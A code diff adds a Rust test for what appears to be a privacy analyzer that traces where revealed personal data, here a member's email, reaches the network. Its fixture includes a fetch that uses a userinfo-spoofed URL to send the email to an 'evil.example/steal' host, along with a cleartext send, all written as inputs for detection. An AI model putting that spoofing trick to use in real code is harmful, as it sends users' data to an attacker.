@@ -1969,3 +1969,46 @@ async function send(to: string) { await fetch("https://API.Mailer.example:443/se
     let email = || vec!["Member.email".to_string()];
     assert_eq!(found, vec![(5, Plugin("tj:ai".into()), email()), (6, Unknown, email()), (7, Host("evil.example".into()), email()), (10, Host("api.mailer.example".into()), email())], "through helper functions too; a fetch without personal data is no transfer");
 }
+
+#[test]
+fn revealed_data_is_followed_through_every_path_to_the_network() {
+    use tj_core::Destination::{Cleartext, Host, Plugin, Unknown};
+    let src = r#"import { act } from "tj:agent"
+@server object Queue {
+  pending: string[] = []
+  async flush() { for (const to of this.pending) { await fetch("https://queue.example/send", { body: to }) } }
+}
+let last = ""
+@server @read("owner") object Member {
+  @pii("contact", "account") email: string = ""
+  @allow("owner") async reassigned() { let body = ""; body = reveal(this.email, "account"); await fetch("https://reassign.example/x", { body }) }
+  @allow("owner") async spoofed() { await fetch("https://api.mailer.example:x@evil.example/steal", { body: reveal(this.email, "account") }) }
+  @allow("owner") async plain() { await fetch("http://plain.example/x", { body: reveal(this.email, "account") }) }
+  @allow("owner") async joined() { await fetch("https://joined.example/u/" + this.id, { body: reveal(this.email, "account") }) }
+  @allow("owner") async ported() { await fetch(`https://ported.example:8443/${this.id}`, { body: reveal(this.email, "account") }) }
+  @allow("owner") later() { this.schedule(60000, "remind", reveal(this.email, "account")) }
+  async remind(to: string) { await fetch("https://alarm.example/x", { body: to }) }
+  @allow("owner") queue() { Queue.get("main").pending.push(reveal(this.email, "account")) }
+  @allow("owner") keep() { last = reveal(this.email, "account") }
+  contact(): string { return reveal(this.email, "account") }
+  @allow("owner") async help(q: string): any {
+    return await act("Help.", [{ role: "user", text: q }], [{ name: "contact", object: `Member/${this.id}`, method: "contact", description: "The member's email.", params: [], input: { type: "object", properties: {} }, fixed: {} }], 2)
+  }
+}
+async function report() { await fetch("https://global.example/x", { body: last }) }
+"#;
+    assert_eq!(errors(src), "");
+    let line = |at: u32| src[..at as usize].matches('\n').count() + 1;
+    let found: Vec<(usize, tj_core::Destination)> = tj_core::facts(src).transfers.into_iter().map(|t| (line(t.at), t.to)).collect();
+    let has = |l: usize, d: tj_core::Destination| assert!(found.contains(&(l, d.clone())), "line {l} to {d:?} not found in {found:?}");
+    has(4, Host("queue.example".into()));
+    has(9, Host("reassign.example".into()));
+    has(10, Unknown);
+    has(11, Cleartext("plain.example".into()));
+    has(12, Host("joined.example".into()));
+    has(13, Host("ported.example".into()));
+    has(15, Host("alarm.example".into()));
+    has(20, Plugin("tj:ai".into()));
+    has(23, Host("global.example".into()));
+    assert!(!found.iter().any(|(_, d)| *d == Host("api.mailer.example".into())), "a user part does not make the allowed host the destination: {found:?}");
+}
